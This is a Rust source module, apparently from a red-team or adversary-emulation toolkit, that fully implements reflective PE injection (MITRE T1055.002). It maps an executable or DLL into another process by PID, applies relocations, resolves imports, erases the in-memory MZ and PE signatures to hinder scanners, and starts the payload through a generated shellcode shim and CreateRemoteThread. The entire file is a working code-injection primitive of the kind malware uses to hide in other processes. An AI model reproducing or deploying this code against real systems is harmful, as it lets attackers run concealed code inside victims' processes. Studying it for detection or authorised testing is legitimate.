//! Implementation of **MITRE ATT&CK T1055.002: Portable Executable Injection**.
//!
//! This module implements "Reflective PE Injection" (Manual Mapping). Unlike standard
//! shellcode injection, this strategy mimics the Windows OS Loader. It parses a PE file
//! (EXE or DLL) from bytes, maps its sections into a remote process, applies base relocations,
//! resolves imports, and executes the entry point via a shellcode shim.

use std::{
    ffi::c_void,
    mem::transmute,
    os::windows::raw::HANDLE,
    ptr::{null, null_mut},
    slice::from_raw_parts,
};

#[cfg(target_arch = "x86")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
#[cfg(target_arch = "x86_64")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::Debug::{
            IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_FILE_HEADER,
            IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
            ReadProcessMemory, WriteProcessMemory,
        },
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{
            MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        SystemServices::{
            IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_DESCRIPTOR,
            IMAGE_NT_SIGNATURE,
        },
        Threading::{
            CreateRemoteThread, GetCurrentProcessId, LPTHREAD_START_ROUTINE, OpenProcess,
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{PortableExecutable, Strategy, Technique},
    target::Target,
};

#[cfg(target_arch = "x86")]
type ImageThunkData = u32;
#[cfg(target_arch = "x86_64")]
type ImageThunkData = u64;

#[cfg(target_arch = "x86")]
const IMAGE_ORDINAL_FLAG: ImageThunkData = 0x80000000;
#[cfg(target_arch = "x86_64")]
const IMAGE_ORDINAL_FLAG: ImageThunkData = 0x8000000000000000;

/// The concrete strategy implementation for T1055.002.
#[derive(Default)]
pub struct T1055_002;

impl Strategy for T1055_002 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let method = match technique {
            Technique::T1055_002(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        let process_id = match target {
            Target::Pid(id) => *id,
            Target::CurrentProcess => unsafe { GetCurrentProcessId() },
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID or CurrentProcess.",
                    info.mitre_id
                )));
            }
        };

        // Strict Check: T1055.002 is explicitly PE Injection
        let image_bytes = match payload {
            Payload::Executable {
                image_bytes: Some(bytes),
                ..
            }
            | Payload::DllFile {
                image_bytes: Some(bytes),
                ..
            } => bytes,

            Payload::Shellcode { .. } => {
                return Err(Error::Mismatch {
                    strategy: info.mitre_id,
                    variant: "Shellcode (T1055.002 requires a PE file. Use T1055.004 for Shellcode)",
                });
            }
            _ => return Err(Error::Validation("Payload data missing".into())),
        };

        match method {
            PortableExecutable::ManualMapping => {
                info!("Method: Manual Mapping PE Injection");
                inject_pe_manual_map(process_id, image_bytes)
            }
        }
    }
}

// ==============================================================================================

/// Performs the Manual Mapping of the PE file.
fn inject_pe_manual_map(process_id: u32, image_bytes: &[u8]) -> Result<()> {
    // 1. Parse PE Headers
    let pe_context = PeContext::parse(image_bytes)?;
    let image_size = pe_context.nt_headers.OptionalHeader.SizeOfImage as usize;

    info!(
        "Analysis: Payload is {} bytes. Required Remote Size: {} bytes.",
        image_bytes.len(),
        image_size
    );

    // 2. Open Target Process
    let target_process = WindowsAPI::open_process(
        process_id,
        PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE,
    )?;

    // 3. Allocate Memory for the Image
    let remote_addr = target_process.virtual_alloc_ex(image_size, MEM_COMMIT, PAGE_READWRITE)?;
    info!("Allocation: Remote image base at {:p}", remote_addr);

    // 4. Map Headers
    let header_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
    target_process.write_process_memory(remote_addr, &image_bytes[0..header_size])?;

    // 5. Map Sections
    map_sections(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 6. Apply Base Relocations
    let preferred_base = pe_context.nt_headers.OptionalHeader.ImageBase as usize;
    let delta = (remote_addr as usize).wrapping_sub(preferred_base);

    if delta != 0 {
        info!("Relocation: Delta required: {:#x}", delta);
        apply_relocations(
            &target_process,
            &pe_context,
            image_bytes,
            remote_addr,
            delta,
        )?;
    }

    // 7. Resolve Imports
    resolve_imports(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 8. Finalize Permissions (W^X Protection)
    finalize_permissions(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 9. Execute via Shellcode Shim
    // Standard PE EntryPoints cannot be called directly by CreateRemoteThread (signature mismatch).
    let entry_point_rva = pe_context.nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
    let entry_point_addr = (remote_addr as usize + entry_point_rva) as u64;

    // 10. Allocate & Write Shellcode
    info!(
        "Shim: Generating loader for Entry Point: {:#x}",
        entry_point_addr
    );
    let shellcode_bytes = generate_shellcode_shim(entry_point_addr)?;

    let shellcode_addr =
        target_process.virtual_alloc_ex(shellcode_bytes.len(), MEM_COMMIT, PAGE_READWRITE)?;

    target_process.write_process_memory(shellcode_addr, &shellcode_bytes)?;
    target_process.virtual_protect_ex(shellcode_addr, shellcode_bytes.len(), PAGE_EXECUTE_READ)?;

    // 11. Trigger Execution
    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(shellcode_addr) };
    let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;

    Ok(())
}

// ==============================================================================================

fn map_sections(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    for i in 0..pe_context.section_count {
        let section = pe_context.get_section(image_bytes, i);
        let raw_size = section.SizeOfRawData as usize;
        let raw_offset = section.PointerToRawData as usize;
        let virt_addr = section.VirtualAddress as usize;

        if raw_size == 0 {
            continue;
        }

        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
        if raw_offset + raw_size <= image_bytes.len() {
            target_process
                .write_process_memory(dest_addr, &image_bytes[raw_offset..raw_offset + raw_size])?;
        }
    }
    Ok(())
}

fn finalize_permissions(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    // 1. Surgical Wipe (MZ + PE)
    let zeros_2 = vec![0u8; 2];
    target_process.write_process_memory(remote_addr, &zeros_2)?; // Wipe MZ

    let e_lfanew_offset = 0x3C;
    if image_bytes.len() > e_lfanew_offset + 4 {
        let pe_offset = u32::from_le_bytes([
            image_bytes[e_lfanew_offset],
            image_bytes[e_lfanew_offset + 1],
            image_bytes[e_lfanew_offset + 2],
            image_bytes[e_lfanew_offset + 3],
        ]) as usize;

        let pe_sig_addr = (remote_addr as usize + pe_offset) as *mut c_void;
        let zeros_4 = vec![0u8; 4];
        target_process.write_process_memory(pe_sig_addr, &zeros_4)?; // Wipe PE
    }

    // 2. Lock Headers (Read-Only)
    let header_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
    target_process.virtual_protect_ex(remote_addr, header_size, PAGE_READONLY)?;

    // 3. Set Section Permissions (Enforce W^X)
    for i in 0..pe_context.section_count {
        let section = pe_context.get_section(image_bytes, i);
        let virt_addr = section.VirtualAddress as usize;
        let virt_size = unsafe { section.Misc.VirtualSize } as usize;
        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;

        let chars = section.Characteristics;
        let executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        let readable = (chars & IMAGE_SCN_MEM_READ) != 0;
        let writable = (chars & IMAGE_SCN_MEM_WRITE) != 0;

        let protect = match (executable, readable, writable) {
            (true, _, _) => PAGE_EXECUTE_READ,     // RX (Code)
            (false, true, true) => PAGE_READWRITE, // RW (Data)
            (false, true, false) => PAGE_READONLY, // R (Read-only Data)
            _ => PAGE_READONLY,
        };

        if virt_size > 0 {
            target_process.virtual_protect_ex(dest_addr, virt_size, protect)?;
        }
    }
    Ok(())
}

fn apply_relocations(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
    delta: usize,
) -> Result<()> {
    let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
    let reloc_dir = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

    if reloc_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let mut current_offset = pe_context
        .rva_to_file_offset(reloc_dir.VirtualAddress as usize, image_bytes)
        .ok_or(Error::InvalidImage("Reloc RVA not found".into()))?;

    let end_offset = current_offset + reloc_dir.Size as usize;

    while current_offset < end_offset {
        let block =
            unsafe { &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_BASE_RELOCATION) };

        if block.SizeOfBlock == 0 {
            break;
        }

        let count =
            (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
        let page_rva = block.VirtualAddress as usize;

        let entries_ptr = unsafe {
            image_bytes
                .as_ptr()
                .add(current_offset + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16
        };
        let entries = unsafe { from_raw_parts(entries_ptr, count) };

        for &entry in entries {
            let type_ = (entry >> 12) as u8;
            let offset = (entry & 0x0FFF) as usize;

            #[cfg(target_arch = "x86_64")]
            let supported = type_ == 10; // IMAGE_REL_BASED_DIR64
            #[cfg(target_arch = "x86")]
            let supported = type_ == 3; // IMAGE_REL_BASED_HIGHLOW

            if supported {
                let target_addr = (remote_addr as usize + page_rva + offset) as *mut c_void;
                let mut ptr_bytes = [0u8; size_of::<usize>()];

                target_process.read_process_memory(target_addr, &mut ptr_bytes)?;
                let original_ptr = usize::from_le_bytes(ptr_bytes);
                let patched_ptr = original_ptr.wrapping_add(delta);
                target_process.write_process_memory(target_addr, &patched_ptr.to_le_bytes())?;
            }
        }
        current_offset += block.SizeOfBlock as usize;
    }
    Ok(())
}

fn resolve_imports(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
    let import_dir = data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];

    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let mut current_offset = pe_context
        .rva_to_file_offset(import_dir.VirtualAddress as usize, image_bytes)
        .ok_or(Error::InvalidImage("Import RVA not found".into()))?;

    loop {
        let desc = unsafe {
            &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_IMPORT_DESCRIPTOR)
        };

        if desc.Name == 0 {
            break;
        }

        let name_offset = pe_context
            .rva_to_file_offset(desc.Name as usize, image_bytes)
            .ok_or(Error::InvalidImage("Import Name RVA".into()))?;
        let lib_name = unsafe { image_bytes.as_ptr().add(name_offset) } as *const i8;

        let module_handle = unsafe { LoadLibraryA(lib_name as *const u8) };
        if module_handle.is_null() {
            return Err(Error::Win32("LoadLibraryA", unsafe { GetLastError() }));
        }

        let mut int_rva = unsafe { desc.Anonymous.OriginalFirstThunk };
        if int_rva == 0 {
            int_rva = desc.FirstThunk;
        }

        let mut int_offset = pe_context
            .rva_to_file_offset(int_rva as usize, image_bytes)
            .ok_or(Error::InvalidImage("INT RVA".into()))?;

        let mut iat_addr = (remote_addr as usize + desc.FirstThunk as usize) as *mut c_void;

        loop {
            let thunk_data =
                unsafe { *(image_bytes.as_ptr().add(int_offset) as *const ImageThunkData) };

            if thunk_data == 0 {
                break;
            }

            let func_addr = if (thunk_data & IMAGE_ORDINAL_FLAG) != 0 {
                let ordinal = (thunk_data & 0xFFFF) as u16;
                unsafe { GetProcAddress(module_handle, ordinal as usize as *const u8) }
            } else {
                let name_rva = (thunk_data & !IMAGE_ORDINAL_FLAG) as usize;
                let name_offset = pe_context
                    .rva_to_file_offset(name_rva, image_bytes)
                    .ok_or(Error::InvalidImage("HintName RVA".into()))?;
                let func_name = unsafe { image_bytes.as_ptr().add(name_offset + 2) as *const i8 };
                unsafe { GetProcAddress(module_handle, func_name as *const u8) }
            };

            let func_addr =
                func_addr.ok_or(Error::Win32("GetProcAddress", unsafe { GetLastError() }))?;
            let addr_val = func_addr as usize;

            target_process.write_process_memory(iat_addr, &addr_val.to_le_bytes())?;

            int_offset += size_of::<ImageThunkData>();
            iat_addr = (iat_addr as usize + size_of::<ImageThunkData>()) as *mut c_void;
        }
        current_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
    }
    Ok(())
}

fn generate_shellcode_shim(entry_point_addr: u64) -> Result<Vec<u8>> {
    #[cfg(target_arch = "x86_64")]
    {
        let mut code = Vec::new();
        // SUB RSP, 40 (Align)
        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // MOV RAX, <Address>
        code.extend_from_slice(&[0x48, 0xB8]);
        code.extend_from_slice(&entry_point_addr.to_le_bytes());
        // CALL RAX
        code.extend_from_slice(&[0xFF, 0xD0]);
        // ADD RSP, 40
        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
        // RET
        code.push(0xC3);
        Ok(code)
    }

    #[cfg(target_arch = "x86")]
    {
        let mut code = Vec::new();
        let entry_point_u32 = entry_point_addr as u32;
        // MOV EAX, <Address>
        code.push(0xB8);
        code.extend_from_slice(&entry_point_u32.to_le_bytes());
        // CALL EAX
        code.extend_from_slice(&[0xFF, 0xD0]);
        // RET 4
        code.extend_from_slice(&[0xC2, 0x04, 0x00]);
        Ok(code)
    }
}

// ==============================================================================================
// Shared Structures

struct PeContext {
    nt_headers: IMAGE_NT_HEADERS,
    section_count: u16,
    section_header_offset: usize,
}

impl PeContext {
    fn parse(image_bytes: &[u8]) -> Result<Self> {
        if image_bytes.len() < size_of::<IMAGE_DOS_HEADER>() {
            return Err(Error::InvalidImage("File too small".into()));
        }
        let dos = unsafe { &*(image_bytes.as_ptr() as *const IMAGE_DOS_HEADER) };
        if dos.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(Error::InvalidImage("Invalid DOS Sig".into()));
        }
        let nt_headers_offset = dos.e_lfanew as usize;
        if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > image_bytes.len() {
            return Err(Error::InvalidImage("Invalid NT Offset".into()));
        }
        let nt_headers =
            unsafe { &*(image_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS) };
        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(Error::InvalidImage("Invalid NT Sig".into()));
        }
        let section_header_offset = nt_headers_offset
            + size_of::<u32>()
            + size_of::<IMAGE_FILE_HEADER>()
            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
        Ok(Self {
            nt_headers: *nt_headers,
            section_count: nt_headers.FileHeader.NumberOfSections,
            section_header_offset,
        })
    }

    fn get_section<'a>(&self, image_bytes: &'a [u8], index: u16) -> &'a IMAGE_SECTION_HEADER {
        let offset =
            self.section_header_offset + (index as usize * size_of::<IMAGE_SECTION_HEADER>());
        unsafe { &*(image_bytes.as_ptr().add(offset) as *const IMAGE_SECTION_HEADER) }
    }

    fn rva_to_file_offset(&self, rva: usize, image_bytes: &[u8]) -> Option<usize> {
        for i in 0..self.section_count {
            let section_header = self.get_section(image_bytes, i);
            let virtual_addr_start = section_header.VirtualAddress as usize;
            let virtual_addr_size = unsafe { section_header.Misc.VirtualSize } as usize;
            if rva >= virtual_addr_start && rva < virtual_addr_start + virtual_addr_size {
                let delta = rva - virtual_addr_start;
                let raw = section_header.PointerToRawData as usize;
                if raw + delta < image_bytes.len() {
                    return Some(raw + delta);
                }
            }
        }
        None
    }
}

// ==============================================================================================

struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

struct WindowsAPI {
    handle: HandleGuard,
}

impl WindowsAPI {
    fn open_process(process_id: u32, access_rights: u32) -> Result<Self> {
        let handle = unsafe { OpenProcess(access_rights, FALSE, process_id) };
        if handle.is_null() {
            Err(Error::Win32("OpenProcess", unsafe { GetLastError() }))
        } else {
            Ok(Self {
                handle: HandleGuard::new(handle),
            })
        }
    }

    fn virtual_alloc_ex(
        &self,
        size: usize,
        allocation_type: u32,
        protection_flags: u32,
    ) -> Result<*mut c_void> {
        let addr = unsafe {
            VirtualAllocEx(
                self.handle.0,
                null(),
                size,
                allocation_type,
                protection_flags,
            )
        };
        if addr.is_null() {
            Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }))
        } else {
            Ok(addr)
        }
    }

    fn virtual_protect_ex(
        &self,
        addr: *mut c_void,
        size: usize,
        new_protection: u32,
    ) -> Result<()> {
        let mut old_protection = 0;
        let success = unsafe {
            VirtualProtectEx(
                self.handle.0,
                addr,
                size,
                new_protection,
                &mut old_protection,
            )
        };
        if success == 0 {
            Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }))
        } else {
            Ok(())
        }
    }

    fn write_process_memory<T: Copy>(&self, addr: *mut c_void, data: &[T]) -> Result<()> {
        let size_bytes = size_of_val(data);
        let mut write_len: usize = 0;
        let success = unsafe {
            WriteProcessMemory(
                self.handle.0,
                addr,
                data.as_ptr().cast(),
                size_bytes,
                &mut write_len,
            )
        };
        if success == 0 || write_len != size_bytes {
            Err(Error::Win32("WriteProcessMemory", unsafe {
                GetLastError()
            }))
        } else {
            Ok(())
        }
    }

    fn read_process_memory(&self, addr: *mut c_void, buffer: &mut [u8]) -> Result<()> {
        let mut read = 0;
        let res = unsafe {
            ReadProcessMemory(
                self.handle.0,
                addr,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len(),
                &mut read,
            )
        };
        if res == 0 {
            Err(Error::Win32("ReadProcessMemory (Buf)", unsafe {
                GetLastError()
            }))
        } else {
            Ok(())
        }
    }

    fn create_remote_thread(
        &self,
        routine_ptr: LPTHREAD_START_ROUTINE,
        parameter: *const c_void,
    ) -> Result<HandleGuard> {
        let handle = unsafe {
            CreateRemoteThread(
                self.handle.0,
                null(),
                0,
                routine_ptr,
                parameter,
                0,
                null_mut(),
            )
        };
        if handle.is_null() {
            Err(Error::Win32("CreateRemoteThread", unsafe {
                GetLastError()
            }))
        } else {
            Ok(HandleGuard::new(handle))
        }
    }
}
